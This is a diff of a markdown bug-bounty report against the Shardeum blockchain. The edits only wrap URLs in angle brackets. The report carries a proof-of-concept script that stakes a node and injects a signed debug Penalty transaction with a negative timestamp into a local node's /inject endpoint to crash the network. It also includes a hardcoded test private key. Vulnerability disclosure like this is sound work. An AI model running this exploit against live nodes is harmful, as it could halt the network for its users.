@@ -5,7 +5,7 @@
 * **Report ID:** #35696
 * **Report Type:** Blockchain/DLT
 * **Report severity:** Critical
-* **Target:** https://github.com/shardeum/shardeum/tree/dev
+* **Target:** <https://github.com/shardeum/shardeum/tree/dev>
 * **Impacts:**
   * Network not being able to confirm new transactions (total network shutdown)
 
@@ -31,7 +31,7 @@ BTW, you also have typo in "reportedNodePublickKey" name.
 
 ## Recommendations
 
-Along with this specific fix, I generally recommend to use this typescript-eslint rule https://typescript-eslint.io/rules/no-floating-promises to enforce promise handling, reducing the possibility of such cases.
+Along with this specific fix, I generally recommend to use this typescript-eslint rule <https://typescript-eslint.io/rules/no-floating-promises> to enforce promise handling, reducing the possibility of such cases.
 
 Same issue is also at least theoretically possible in ClaimReward handling (no await on \`applyClaimRewardTx\`), yet I do not see possible practical possibilities of causing crash in it.
 
@@ -59,10 +59,10 @@ if (isBadNode) {
 
 \`\`\` const keypair = JSON.parse(await fs.readFile('../instances/shardus-instance-9005/secrets.json'))
 
-const provider = new ethers.JsonRpcProvider('http://localhost:8080', 8082, { batchMaxCount: 1 }) const walletWithProvider = new ethers.Wallet( '0x82beccb10f7c4552334dbf1d778a88d7749656fc329ca4ea4c66f714ed7760fb', provider ) // address 0xCf551a61548863765bf635feaAa2501636B91908 console.log('address', walletWithProvider.address) const stakeRequired = BigInt('0x8ac7230489e80000')
+const provider = new ethers.JsonRpcProvider('<http://localhost:8080>', 8082, { batchMaxCount: 1 }) const walletWithProvider = new ethers.Wallet( '0x82beccb10f7c4552334dbf1d778a88d7749656fc329ca4ea4c66f714ed7760fb', provider ) // address 0xCf551a61548863765bf635feaAa2501636B91908 console.log('address', walletWithProvider.address) const stakeRequired = BigInt('0x8ac7230489e80000')
 
 enum Step { stake, init, unstake, penalty, }
 
 const step = Step.penalty
 
-switch (step) { case Step.stake: { const raw = await walletWithProvider.signTransaction({ to: '0x0000000000000000000000000000000000010000', gasPrice: '30000', gasLimit: 30000000, value: stakeRequired, chainId: 8082, data: ethers.hexlify( ethers.toUtf8Bytes( JSON.stringify({ isInternalTx: true, internalTXType: InternalTXType.Stake, nominator: walletWithProvider.address.toLowerCase(), timestamp: Date.now(), nominee: keypair.publicKey, stake: { dataType: 'bi', value: stakeRequired.toString(16) }, }) ) ), nonce: await walletWithProvider.getNonce(), }) await post('http://127.0.0.1:9005/inject', { raw, timestamp: Date.now(), appDataOverride: { networkAccount: networkAccount, }, }) break } case Step.init: { await post( 'http://127.0.0.1:9005/inject', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.InitRewardTimes, nominee: keypair.publicKey, nodeActivatedTime: 1, timestamp: Date.now() - 5 \* 60000, }, keypair.secretKey, keypair.publicKey ) ) break } case Step.penalty: { await post( 'http://127.0.0.1:9005/inject', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.Penalty, reportedNodePublickKey: keypair.publicKey, operatorEVMAddress: walletWithProvider.address, timestamp: -1, // validatePenaltyTX: 1999 - this can be skipped with isDebugTx }, keypair.secretKey, keypair.publicKey ) ) break; } } \`\`\`
+switch (step) { case Step.stake: { const raw = await walletWithProvider.signTransaction({ to: '0x0000000000000000000000000000000000010000', gasPrice: '30000', gasLimit: 30000000, value: stakeRequired, chainId: 8082, data: ethers.hexlify( ethers.toUtf8Bytes( JSON.stringify({ isInternalTx: true, internalTXType: InternalTXType.Stake, nominator: walletWithProvider.address.toLowerCase(), timestamp: Date.now(), nominee: keypair.publicKey, stake: { dataType: 'bi', value: stakeRequired.toString(16) }, }) ) ), nonce: await walletWithProvider.getNonce(), }) await post('<http://127.0.0.1:9005/inject>', { raw, timestamp: Date.now(), appDataOverride: { networkAccount: networkAccount, }, }) break } case Step.init: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.InitRewardTimes, nominee: keypair.publicKey, nodeActivatedTime: 1, timestamp: Date.now() - 5 \* 60000, }, keypair.secretKey, keypair.publicKey ) ) break } case Step.penalty: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.Penalty, reportedNodePublickKey: keypair.publicKey, operatorEVMAddress: walletWithProvider.address, timestamp: -1, // validatePenaltyTX: 1999 - this can be skipped with isDebugTx }, keypair.secretKey, keypair.publicKey ) ) break; } } \`\`\`
